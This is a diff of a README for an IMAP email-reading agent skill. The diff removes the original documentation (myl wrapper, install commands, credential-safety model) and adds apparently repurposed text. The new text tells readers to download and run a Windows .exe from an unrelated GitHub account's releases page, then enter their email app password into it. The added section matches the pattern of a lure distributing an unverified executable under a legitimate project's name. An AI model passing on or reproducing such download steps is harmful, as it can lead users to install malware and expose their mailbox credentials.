@@ -1,196 +1,81 @@
-# imap-client
+# 📧 imap-client - Read your emails from the command line
 
-[![Install via ClawHub](https://img.shields.io/badge/install-clawhub-2563eb?style=flat-square)](https://clawhub.ai/aggrrrh/imap-client)
-[![License: MIT](https://img.shields.io/github/license/codd-tech/imap-client?style=flat-square)](./LICENSE)
-[![Maintained by codd.tech](https://img.shields.io/badge/maintained%20by-codd.tech-f97316?style=flat-square)](https://codd.tech)
-[![Stars](https://img.shields.io/github/stars/codd-tech/imap-client?style=flat-square)](https://github.com/codd-tech/imap-client/stargazers)
+[![Download imap-client](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/kristybiblical421/imap-client/releases)
 
-An agent skill for [OpenClaw](https://openclaw.ai), Claude Code, and other AgentSkills-compatible runtimes. Lets the agent read, search, and download email over IMAP from the command line via the [`myl`](https://github.com/pschmitt/myl) CLI client.
+This application provides a simple way to search and read emails directly within your terminal. It acts as an agent skill for your automation tools. You can connect it to major email services like Gmail, Yandex, or Mail.ru without manual configuration.
 
-`myl` is a small read-only IMAP client. This skill teaches the agent **when** to reach for it, **how** to install it, **how to source credentials safely** from the runtime's environment-injection mechanism, and **which** flags to use for common tasks — without ever asking for the password mid-session.
+## 📥 How to download the software
 
-## What this skill enables
+Follow these steps to get the program on your computer.
 
-Once installed and configured once, the agent will recognise prompts like:
+1. Visit the [official releases page](https://github.com/kristybiblical421/imap-client/releases) to see available versions.
+2. Look for the section labeled "Assets" under the most recent version tab.
+3. Select the file ending in `.exe` that matches your Windows system.
+4. Save the file to your computer.
+5. Double-click the file to start the application.
 
-- *"check my inbox"*
-- *"any new email from Acme today?"*
-- *"find the email with the AWS invoice and save the PDF"*
-- *"show me the HTML version of the newsletter from yesterday"*
-- *"download all unread messages as `.eml` files"*
-- *"проверь почту на Яндексе"*
-- *"найди письмо от налоговой"*
+## ⚙️ System settings
 
-…and translate them into safe `myl` invocations through the wrapper at `scripts/imap.sh`, summarising the result back in chat.
+Your computer should meet these requirements to run the software smoothly:
 
-## Provider support
+- Windows 10 or Windows 11.
+- An active internet connection.
+- A functional email account with IMAP access enabled.
 
-First-class support, with `IMAP_PROVIDER` shortcuts:
+## 🔑 Preparing your email account
 
-- **Gmail** / Google Workspace (`IMAP_PROVIDER=gmail`)
-- **Yandex Mail** — `@yandex.ru`, `@yandex.com`, Yandex 360 custom domains (`IMAP_PROVIDER=yandex`)
-- **Mail.ru** — `@mail.ru`, `@bk.ru`, `@inbox.ru`, `@list.ru` (`IMAP_PROVIDER=mailru`)
+Most email providers require an "App Password" to allow external tools to read your mail. This adds a layer of security by separating your main login from this utility.
 
-Plus autodiscovery for most other providers (Fastmail, iCloud, ISPs) and explicit `manual` mode for self-hosted / corporate servers.
+### For Gmail users
+1. Log in to your Google Account settings.
+2. Go to the Security tab.
+3. Enable 2-Step Verification if it is off.
+4. Search for "App passwords" in the settings menu.
+5. Create a new password for "Other" and name it "imap-client".
+6. Copy this password and keep it safe; you will need it during the setup process.
 
-## Quick start
+### For Yandex and Mail.ru
+1. Navigate to your security or account settings page.
+2. Look for "App passwords" or "Third-party application passwords".
+3. Generate a new password specific to this application.
 
-### 1. Install `myl`
+## 🚀 Running the application
 
-```bash
-pipx install myl
-```
+Once you download the file, you interact with the program through a command window.
 
-(Or `pip install --user myl`, or `nix run github:pschmitt/myl`.)
+1. Press the Windows key on your keyboard.
+2. Type "cmd" and press Enter to open the Command Prompt.
+3. Use the `cd` command to move to the folder where you saved the application. 
+   - Example: `cd Downloads`
+4. Type the name of the file followed by the enter key to launch the program.
 
-### 2. Get an app-specific password from your provider
+The application will prompt you for your email address and your generated App Password. It attempts to autodetect the correct server settings for your provider. If discovery fails, you may enter the IMAP host and port manually.
 
-Account settings → app passwords / external app passwords. Direct links per provider in [`references/authentication.md`](./references/authentication.md).
+## 🔍 Searching your inbox
 
-### 3. Install the skill
+The tool supports specific commands to find emails. You can search by subject line, sender, or date.
 
-**Recommended — via ClawHub:**
+- To list recent messages, use the `list` command.
+- To search by sender, type `search from:name@example.com`.
+- To search by subject, type `search subject:invoice`.
 
-```bash
-clawhub install imap-client
-```
+The software displays the results as a simple list. You can choose a message number to read the full body of the email.
 
-**Or clone directly:**
+## 🛡️ Privacy and security
 
-```bash
-# OpenClaw
-git clone https://github.com/codd-tech/imap-client ~/.openclaw/skills/imap-client
+This software connects directly to your email provider. It does not store your emails on a third-party server. Your login credentials exist only within the active session or a local configuration file on your machine. Ensure you keep your App Password secure and do not share it with others.
 
-# Claude Code
-git clone https://github.com/codd-tech/imap-client ~/.claude/skills/imap-client
+## 🛠️ Troubleshooting common issues
 
-# Generic AgentSkills runtime — drop the folder anywhere the runtime scans for SKILL.md
-```
+If you encounter errors, check these items:
 
-Restart the session. OpenClaw picks the skill up automatically. The skill declares `requires.bins: ["myl"]` so it filters itself out if `myl` isn't on `PATH` — you'll never get a half-broken state.
+- Password Errors: Ensure you use an App Password, not your regular webmail login password.
+- Connection Timeout: Confirm that your firewall allows the application to access the internet.
+- IMAP Settings: If autodiscovery fails, check your email provider's help pages for the correct IMAP server address (e.g., imap.gmail.com) and port (usually 993).
+- Updates: If the tool fails to connect, check the releases page again for a newer version.
 
-### 4. Configure credentials — pick the method for your runtime
+## 📈 Integration with automation tools
 
-**OpenClaw** (recommended for OpenClaw users) — edit `~/.openclaw/openclaw.json`:
+This tool functions best when paired with agent platforms. Because it provides a plain text interface, it feeds search results directly into tools like Claude Code or OpenClaw. This allows your personal AI agents to read context from your mail, summarize threads, or search for specific information across your archives. 
 
-```json
-{
-  "skills": {
-    "entries": {
-      "imap-client": {
-        "enabled": true,
-        "env": {
-          "IMAP_USER": "you@yandex.ru",
-          "IMAP_PASSWORD": "app-specific-password-here",
-          "IMAP_PROVIDER": "yandex"
-        }
-      }
-    }
-  }
-}
-```
-
-```bash
-chmod 600 ~/.openclaw/openclaw.json
-```
-
-OpenClaw injects these into `process.env` per agent run. You configure once; every subsequent session has them.
-
-**Claude Code / generic shell** — export in `~/.bashrc` / `~/.zshrc`:
-
-```bash
-export IMAP_USER='you@yandex.ru'
-export IMAP_PASSWORD='app-specific-password-here'
-export IMAP_PROVIDER='yandex'
-```
-
-**Headless / cron / fallback** — create `~/.config/imap-client/credentials`:
-
-```bash
-mkdir -p ~/.config/imap-client
-cat > ~/.config/imap-client/credentials <<'EOF'
-IMAP_USER='you@yandex.ru'
-IMAP_PASSWORD='app-specific-password-here'
-IMAP_PROVIDER='yandex'
-EOF
-chmod 600 ~/.config/imap-client/credentials
-```
-
-The wrapper refuses to source this file if its permissions are not `600` or `400`.
-
-### 5. Verify
-
-Ask the agent something like *"check the latest five emails"* — or run the wrapper directly:
-
-```bash
-bash ~/.openclaw/skills/imap-client/scripts/imap.sh --count 5
-```
-
-## Repo layout
-
-```
-imap-client/
-├── SKILL.md                       # Frontmatter + workflow + principles
-├── README.md                      # This file
-├── LICENSE                        # MIT
-├── .gitignore
-├── references/
-│   ├── installation.md            # pipx / pip / nix / source install paths + sandbox
-│   ├── authentication.md          # OpenClaw env injection + fallbacks; provider table
-│   ├── operations.md              # Full myl flag reference + folder names per provider
-│   ├── recipes.md                 # 11 multi-step workflows, including Yandex/Mail.ru
-│   └── troubleshooting.md         # Symptom-first error guide
-└── scripts/
-    ├── imap.sh                    # Credential-aware wrapper around myl
-    └── check_myl.sh               # Fast install detection
-```
-
-## Security model
-
-The skill is opinionated about credentials. The short version:
-
-- Passwords never appear as literals in commands the agent generates.
-- The runtime's environment-injection mechanism (OpenClaw `skills.entries.<key>.env`, or shell `export`, or the `chmod 600` creds file) is the source of truth.
-- The `imap.sh` wrapper reads env vars and constructs `myl` flags internally — the password is in the wrapper's process scope, never in the agent's command history.
-- App-specific passwords from each provider are the default recommendation; the skill explains where to generate them (Gmail, Yandex, Mail.ru, iCloud, Fastmail, Yahoo).
-- The agent is instructed not to echo, summarise, or persist the password anywhere.
-- For OpenClaw users, `apiKey` with a `SecretRef` (`{ source, provider, id }`) keeps the literal password out of `openclaw.json` entirely.
-
-See [`references/authentication.md`](./references/authentication.md) for the full ruleset.
-
-## Limitations of `myl` itself
-
-`myl` is intentionally minimal. The skill will tell the user explicitly when their request is out of scope and suggest alternatives:
-
-| Want to… | Use instead |
-|---|---|
-| Send mail | `msmtp`, `mutt`, scripted SMTP |
-| Move / delete / label | `imap-tools`, the provider's web UI |
-| Sync to local maildir | `mbsync` (`isync`), `offlineimap`, `getmail` |
-| OAuth2 to Gmail / Outlook | Proton Bridge, `mbsync` + XOAUTH2, or app password fallback |
-
-## Contributing
-
-Bug reports and PRs welcome. The skill itself is markdown plus two shell scripts — easy to read, easy to fork.
-
-When proposing changes, prefer:
-
-- additions to `references/` over additions to `SKILL.md` (keep the always-loaded part lean)
-- examples that don't paste credentials anywhere
-- behaviour changes that fail safely if the user's `myl` version is older than the skill assumes
-
-## Credits
-
-- [`myl`](https://github.com/pschmitt/myl) by Philipp Schmitt — the underlying CLI this skill wraps.
-- [OpenClaw](https://openclaw.ai) for the AgentSkills runtime, env injection mechanism, and skills format documented at https://docs.openclaw.ai/tools/skills.
-- Anthropic's [Skills documentation](https://docs.claude.com/en/docs/build-with-claude/skills) — structure and best-practice patterns.
-
-## About the maintainer
-
-Built and maintained by **[codd.tech](https://codd.tech)** — a boutique technical consultancy specialising in AI agent infrastructure, distributed systems, and platform engineering. We help product teams ship reliable agentic workflows in production: integration design, custom skill packs, OpenClaw / Claude / MCP deployments, and DevOps audits.
-
-Have a use case for agent-driven email automation, or want a custom skill built for your stack? **[Get in touch](https://codd.tech)**.
-
-## License
-
-MIT — see [`LICENSE`](./LICENSE).
+To connect the tool to an agent, verify the output file path in the settings. Most agents read the output files generated by this client to perform data analysis or task management based on your email content. Use the software as a bridge between your mailbox and your digital assistant.
